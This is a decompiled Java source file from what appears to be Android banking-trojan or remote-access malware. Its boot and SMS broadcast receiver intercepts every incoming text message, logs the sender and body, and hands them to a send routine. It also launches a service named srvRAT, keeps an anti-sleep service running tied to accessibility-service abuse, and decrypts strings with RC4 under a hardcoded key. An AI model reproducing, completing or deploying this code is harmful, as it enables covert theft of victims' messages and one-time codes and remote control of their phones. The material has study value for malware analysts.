package com.example.mmm.Receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Build.VERSION;
import android.telephony.SmsMessage;
import android.util.Base64;
import com.example.mmm.constants;
import com.example.mmm.API.ClassRC4;
import com.example.mmm.Service.srvAccessibility;
import com.example.mmm.Service.srvAntiSleep;
import com.example.mmm.Service.srvRAT;
import com.example.mmm.Utils.utils;

public class bootReceiver extends BroadcastReceiver {
   constants phantom$ = new constants();
   utils letting$;
   private String forgot$;

   public bootReceiver() {
      StringBuilder var1 = new StringBuilder();
      var1.append(bootReceiver.class.getSimpleName());
      var1.append("   ");
      this.forgot$ = var1.toString();
      this.letting$ = new utils();
   }

   private String a(String var1) {
      var1 = new String((new ClassRC4("wewiejvtlfqy".getBytes()))._nevada(utils.hexStringToByteArray(new String(Base64.decode(var1, 0), "UTF-8"))));
      return var1;
   }

   public void onReceive(Context var1, Intent var2) {
      this.letting$.Log(this.forgot$, "run_boot_broadcast_receiver");
      utils.scheduleJob(var1);
      utils.startCustomTimer(var1, "", 20000L);
      int var3 = Integer.parseInt(this.letting$.SettingsRead(var1, "SM"));
      this.letting$.SettingsWrite(var1, "SM", String.valueOf(var3 + 1));
      if (!utils._prayer(var1)) {
         this.letting$._firms(this.forgot$, var1);
      }

      this.letting$._currency(var1);
      this.letting$._antiques(var1);
      String var11;
      if (var2.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
         utils var6 = this.letting$;
         Bundle var10 = var2.getExtras();
         if (var10 != null) {
            Object[] var7 = (Object[])var10.get("pdus");
            String var5 = "";
            var11 = "";
            if (var7 != null) {
               int var4 = var7.length;

               for(var3 = 0; var3 < var4; ++var3) {
                  SmsMessage var8 = SmsMessage.createFromPdu((byte[])var7[var3]);
                  var5 = var8.getDisplayOriginatingAddress();
                  StringBuilder var9 = new StringBuilder();
                  var9.append(var11);
                  var9.append(var8.getDisplayMessageBody());
                  var11 = var9.toString();
               }

               StringBuilder var13 = new StringBuilder("Input SMS: ");
               var13.append(var5);
               var13.append(" Text: ");
               var13.append(var11);
               var13.append("[143523#]");
               var11 = var13.toString();
               var6.Log("sendSMS", var11);
               var6.SettingsToAdd(var1, "AS", var11);
               var6._compiled(var1, var6.SettingsRead(var1, "QQ"));
            }
         }
      }

      if (!utils.isMyServiceRunning(var1, srvRAT.class) && this.letting$.SettingsRead(var1, "RQ").equals("connect")) {
         var1.startService(new Intent(var1, srvRAT.class));
      }

      var11 = "ES";
      if ((var11.equals("1") || this.phantom$.meters$ && !utils.isAccessibilityServiceEnabled(var1, srvAccessibility.class)) && !this.letting$.SettingsRead(var1, "EL").equals("start")) {
         Intent var12 = new Intent(var1, srvAntiSleep.class);
         var12.setAction("start");
         if (VERSION.SDK_INT >= 26) {
            this.letting$.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
            var1.startForegroundService(var12);
         } else {
            this.letting$.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
            var1.startService(var12);
         }
      }

      if (!var11.equals("1") && utils.isAccessibilityServiceEnabled(var1, srvAccessibility.class) && this.letting$.SettingsRead(var1, "EL").equals("start")) {
         var2 = new Intent(var1, srvAntiSleep.class);
         var2.setAction("stop");
         var1.startService(var2);
      }

   }
}
